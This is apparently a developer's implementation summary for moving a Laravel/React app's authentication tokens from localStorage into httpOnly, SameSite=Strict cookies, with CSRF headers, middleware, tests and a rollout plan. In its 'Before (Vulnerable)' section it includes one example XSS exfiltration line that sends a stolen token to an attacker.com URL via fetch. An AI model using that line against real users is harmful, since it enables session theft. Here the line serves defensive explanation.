# httpOnly Cookie Authentication - Implementation Summary

## Phase 2 Progress: XSS-Safe httpOnly Cookie Authentication ✅

**Status**: 🔄 Core implementation complete, ready for React frontend update

---

## Architecture Overview

### 🎯 Security Goal
Completely eliminate XSS token theft by removing localStorage, implementing httpOnly cookies with `Secure` + `SameSite=Strict` flags.

### Before (Vulnerable)
```
❌ Token stored in localStorage
❌ JavaScript can access: localStorage.getItem('token')
❌ XSS attack steals token: fetch('https://attacker.com?token=' + stolen_token)
```

### After (Secure)
```
✅ Token in httpOnly cookie (JavaScript cannot access)
✅ Browser auto-sends cookie with requests (withCredentials: true)
✅ CSRF token in sessionStorage for X-XSRF-TOKEN header
✅ XSS cannot steal token
```

---

## Implementation Details

### 1. Database Changes

**File**: `database/migrations/2025_11_21_150000_add_token_security_columns.php`

New columns:
```sql
ALTER TABLE personal_access_tokens ADD COLUMN token_identifier VARCHAR(255);    -- UUID in cookie
ALTER TABLE personal_access_tokens ADD COLUMN token_hash VARCHAR(255);          -- SHA256 for lookup
ALTER TABLE personal_access_tokens ADD COLUMN device_fingerprint TEXT;          -- Device binding
ALTER TABLE personal_access_tokens ADD COLUMN last_rotated_at TIMESTAMP;        -- Track rotation
```

### 2. Backend Controllers

#### HttpOnlyTokenController
**File**: `app/Http/Controllers/Auth/HttpOnlyTokenController.php`

Methods:
- **login()**: Create UUID token → hash → set httpOnly cookie → return CSRF token
- **refresh()**: Validate old token → create new token → revoke old → set new cookie
- **logout()**: Mark token revoked → clear cookie (Set-Cookie with past expiry)
- **me()**: Return user + token metadata (NOT plaintext token)

Key Security Features:
```php
// ========== Token Format ==========
$tokenIdentifier = Str::uuid()->toString();      // UUID for cookie
$tokenHash = hash('sha256', $tokenIdentifier);   // Hash for DB lookup

// ========== httpOnly Cookie ==========
$response->cookie(
    name: 'soleil_token',
    value: $tokenIdentifier,
    secure: true,        // HTTPS only
    httpOnly: true,      // ⚡ XSS cannot access
    sameSite: 'strict'   // ⚡ CSRF + XSS worm protected
);

// ========== Response = NO plaintext token ==========
// Response contains CSRF token, NOT bearer token
return response()->json([
    'user' => [...],
    'csrf_token' => csrf_token(),  // For X-XSRF-TOKEN header
    // Token ONLY in httpOnly cookie, NOT in response
]);
```

### 3. Middleware

#### CheckHttpOnlyTokenValid
**File**: `app/Http/Middleware/CheckHttpOnlyTokenValid.php`

Validation Flow:
```
1. Extract token_identifier from httpOnly cookie
   └─ Browser auto-includes (withCredentials: true)

2. Hash & lookup token_hash in DB
   └─ token_hash = SHA256(token_identifier)

3. Validate token state
   └─ expires_at > now? (TOKEN_EXPIRED)
   └─ revoked_at null? (TOKEN_REVOKED)
   └─ refresh_count <= threshold? (SUSPICIOUS_ACTIVITY)

4. Validate device fingerprint (optional)
   └─ User-Agent + Accept-Language hash matches

5. Attach to request
   └─ $request->attributes->set('user', $token->tokenable)
   └─ $request->attributes->set('token', $token)
```

### 4. Routes

**File**: `routes/api.php`

Public endpoints:
```php
Route::post('/auth/login-httponly', [HttpOnlyTokenController::class, 'login']);
Route::get('/auth/csrf-token', fn() => response()->json(['csrf_token' => csrf_token()]));
```

Protected endpoints (require httpOnly cookie):
```php
Route::middleware(['check_httponly_token'])->group(function () {
    Route::post('/auth/refresh-httponly', [HttpOnlyTokenController::class, 'refresh']);
    Route::post('/auth/logout-httponly', [HttpOnlyTokenController::class, 'logout']);
    Route::get('/auth/me-httponly', [HttpOnlyTokenController::class, 'me']);
});
```

### 5. Configuration

#### config/sanctum.php
```php
'cookie_name' => 'soleil_token',
'cookie_secure' => env('APP_ENV') === 'production',
'cookie_http_only' => true,      // ⚡ JavaScript cannot access
'cookie_same_site' => 'strict',  // ⚡ CSRF + XSS worm protection
'verify_device_fingerprint' => false,  // Optional (enable in production)
```

#### config/session.php
```php
'http_only' => env('SESSION_HTTP_ONLY', true),
'same_site' => env('SESSION_SAME_SITE', 'strict'),
'secure' => env('SESSION_SECURE_COOKIE', false),
```

#### .env
```dotenv
SANCTUM_SHORT_LIVED_EXPIRATION_MINUTES=60
SANCTUM_LONG_LIVED_EXPIRATION_DAYS=30
SANCTUM_MAX_REFRESH_COUNT_PER_HOUR=10
SANCTUM_SINGLE_DEVICE_LOGIN=true
SANCTUM_DELETE_OLD_TOKENS_AFTER_DAYS=7
SANCTUM_COOKIE_NAME=soleil_token
SESSION_DOMAIN=.localhost
SESSION_HTTP_ONLY=true
SESSION_SAME_SITE=strict
SESSION_SECURE_COOKIE=false
SANCTUM_VERIFY_DEVICE_FINGERPRINT=false
```

---

## Testing

### Test File
**File**: `tests/Feature/HttpOnlyCookieAuthenticationTest.php`

11 comprehensive tests:
1. ✅ Login sets httpOnly cookie (NO plaintext token in response)
2. ✅ Token stored with UUID identifier + hash
3. ✅ Refresh rotates token (old revoked)
4. ✅ Logout revokes + clears cookie
5. ✅ Revoked token cannot access endpoints (401 TOKEN_REVOKED)
6. ✅ Expired token returns 401 TOKEN_EXPIRED
7. ✅ Missing cookie returns 401
8. ✅ Invalid identifier returns 401
9. ✅ CSRF token endpoint accessible publicly
10. ✅ Me endpoint returns user + token metadata
11. ✅ Excessive refresh triggers SUSPICIOUS_ACTIVITY

### Running Tests
```bash
# Run httpOnly cookie tests
php artisan test tests/Feature/HttpOnlyCookieAuthenticationTest.php

# Run all tests
php artisan test
```

---

## Frontend Integration (React/Axios)

### Key Changes Required

#### 1. api.ts - Axios Configuration
```typescript
const api = axios.create({
  withCredentials: true,  // ⚡ CRITICAL: Auto-send cookies
});

// Interceptor: Add X-XSRF-TOKEN header
api.interceptors.request.use((config) => {
  const csrfToken = sessionStorage.getItem('csrf_token');
  if (csrfToken && config.method !== 'get') {
    config.headers['X-XSRF-TOKEN'] = csrfToken;
  }
  return config;
});

// Interceptor: Handle 401 → auto-refresh
api.interceptors.response.use(
  (response) => response,
  async (error) => {
    if (error.response?.status === 401 && !originalRequest._retry) {
      originalRequest._retry = true;
      await api.post('/auth/refresh-httponly');
      return api(originalRequest);
    }
    return Promise.reject(error);
  }
);
```

#### 2. useAuth Hook - Login/Logout
```typescript
const login = async (email: string, password: string) => {
  const response = await api.post('/auth/login-httponly', {
    email, password, remember_me: false
  });
  
  // ✅ Token in httpOnly cookie (auto by browser)
  // ✅ CSRF token in response → save to sessionStorage
  sessionStorage.setItem('csrf_token', response.data.csrf_token);
  setUser(response.data.user);
};

const logout = async () => {
  await api.post('/auth/logout-httponly');
  sessionStorage.clear();
  setUser(null);
};
```

#### 3. Remove All localStorage Token Codes
**MUST DELETE**:
- `localStorage.setItem('token', ...)`
- `localStorage.getItem('token')`
- Any token in localStorage initialization
- Any Bearer token in Authorization header

---

## Security Validations

### Cookie Flags (Production)

```http
Set-Cookie: soleil_token=<uuid>; 
  Path=/; 
  Domain=.soleilhostel.com; 
  HttpOnly;      // ⚡ XSS cannot read
  Secure;        // ⚡ HTTPS only
  SameSite=Strict;  // ⚡ CSRF + XSS worm protected
```

### CSRF Protection Flow

```
1. Frontend: GET /api/auth/csrf-token
   ← Response: { csrf_token: "abc123..." }

2. Frontend: POST /api/auth/login-httponly
   + Body: { email, password }
   → Response: { csrf_token: "xyz789...", user: {...} }

3. Frontend: Store csrf_token in sessionStorage
   ← sessionStorage.setItem('csrf_token', 'xyz789...')

4. Frontend: POST /api/bookings (protected)
   + Headers: { X-XSRF-TOKEN: 'xyz789...' }
   + Cookie: soleil_token=<uuid> (auto-sent by browser)
   → Backend: Validate CSRF token + token from cookie
```

### XSS Prevention Validation

```javascript
// ❌ This WILL FAIL (XSS prevented):
const token = document.cookie;  // httpOnly cookies not included!
localStorage.getItem('token');  // No token in localStorage

// ✅ This WORKS (browser handles automatically):
fetch('/api/bookings', {
  credentials: 'include',  // Send httpOnly cookie
  headers: {
    'X-XSRF-TOKEN': sessionStorage.getItem('csrf_token')
  }
});
// httpOnly cookie sent automatically by browser
```

---

## Rollout Plan

### Phase 1: Backend (✅ COMPLETE)
- [x] Database migration created
- [x] HttpOnlyTokenController implemented
- [x] CheckHttpOnlyTokenValid middleware created
- [x] Routes configured
- [x] Config files updated (sanctum.php, session.php, .env)
- [x] Feature tests written (11 tests)

### Phase 2: Frontend (⏳ TO DO)
- [ ] Update api.ts: `withCredentials: true`, add interceptors
- [ ] Update useAuth hook: `sessionStorage` instead of `localStorage`
- [ ] Update LoginForm: call `/api/auth/login-httponly`
- [ ] Update ProtectedRoute: validate token on mount
- [ ] REMOVE ALL localStorage.setItem('token') code
- [ ] REMOVE ALL localStorage.getItem('token') code
- [ ] Add CSRF token management (sessionStorage)
- [ ] Test in browser: verify no tokens in localStorage/DevTools Storage
- [ ] Test XSS: verify token not accessible via console

### Phase 3: Migration (⏳ TO DO)
- [ ] Deploy new endpoints alongside old ones (backward compatibility)
- [ ] Frontend: Switch to new httpOnly endpoints
- [ ] Monitor: Check 401 refresh-auto-retry behavior
- [ ] Deprecate: Old Bearer token endpoints (v2)
- [ ] Cleanup: Remove old auth controllers

### Phase 4: Verification (⏳ TO DO)
- [ ] Browser DevTools: No tokens in Application → Storage
- [ ] Browser DevTools: No tokens in Application → Cookies (httpOnly)
- [ ] XSS Test: Injected script cannot access `document.cookie`
- [ ] CSRF Test: Cross-domain request denied (SameSite=Strict)
- [ ] Refresh Test: 401 triggers automatic refresh + retry
- [ ] Logout Test: Cookie cleared, sessionStorage cleared

---

## Common Issues & Solutions

### Issue 1: CORS Error with Cookies
```
Error: No 'Access-Control-Allow-Credentials' header
```

**Solution**:
```php
// config/cors.php
'supports_credentials' => true,
```

```typescript
// api.ts
axios.create({
  withCredentials: true,  // ⚡ MUST be true
});
```

### Issue 2: CSRF Token Mismatch
```
Error: TokenMismatchException
```

**Solution**:
- Ensure X-XSRF-TOKEN header sent with CSRF token from response
- CSRF token must be fresh (from login response, not old)
- sessionStorage clearing on logout prevents stale tokens

### Issue 3: 401 on Subsequent Requests
```
Symptom: Login works, but next request returns 401
```

**Solution**:
- Verify cookie being sent: Chrome DevTools → Network → check Set-Cookie + Cookie headers
- Verify `withCredentials: true` in axios
- Verify domain matches (localhost vs 127.0.0.1)

### Issue 4: Refresh Loop
```
Symptom: Refresh endpoint called repeatedly, infinite loop
```

**Solution**:
```typescript
// Prevent retry loop
if (error.response?.status === 401 && originalRequest._retry) {
  // Second 401 after refresh = truly invalid
  logout();
  window.location.href = '/login';
  return Promise.reject(error);
}
```

---

## Files Modified/Created

### Created
1. `app/Http/Controllers/Auth/HttpOnlyTokenController.php` (347 lines)
2. `app/Http/Middleware/CheckHttpOnlyTokenValid.php` (148 lines)
3. `database/migrations/2025_11_21_150000_add_token_security_columns.php`
4. `tests/Feature/HttpOnlyCookieAuthenticationTest.php` (367 lines)
5. `HTTPONLY_COOKIE_IMPLEMENTATION.md` (Frontend guide)
6. `.env.httponly-cookie` (Environment template)

### Modified
1. `routes/api.php` - Added httpOnly routes + controller import
2. `config/sanctum.php` - Added httpOnly cookie config
3. `config/session.php` - Added http_only, same_site, secure flags
4. `bootstrap/app.php` - Registered CheckHttpOnlyTokenValid middleware
5. `.env` - Added Sanctum + session configuration

---

## Next Steps

1. **Migration**: Run `php artisan migrate` to create token columns
2. **Testing**: Run `php artisan test` to verify all endpoints
3. **Frontend**: Update React components (see HTTPONLY_COOKIE_IMPLEMENTATION.md)
4. **Verification**: Manual testing in browser DevTools
5. **Deployment**: Deploy backend + frontend changes together

---

## Documentation

- [Frontend Integration Guide](./HTTPONLY_COOKIE_IMPLEMENTATION.md)
- [Token Expiration Implementation](./TOKEN_EXPIRATION_IMPLEMENTATION.md)
- [Security Best Practices](./SECURITY_IMPLEMENTATION.md)

---

## References

- [OWASP: AuthenticationCheatSheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [MDN: httpOnly Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie)
- [OWASP: XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [Laravel Sanctum Documentation](https://laravel.com/docs/11.x/sanctum)
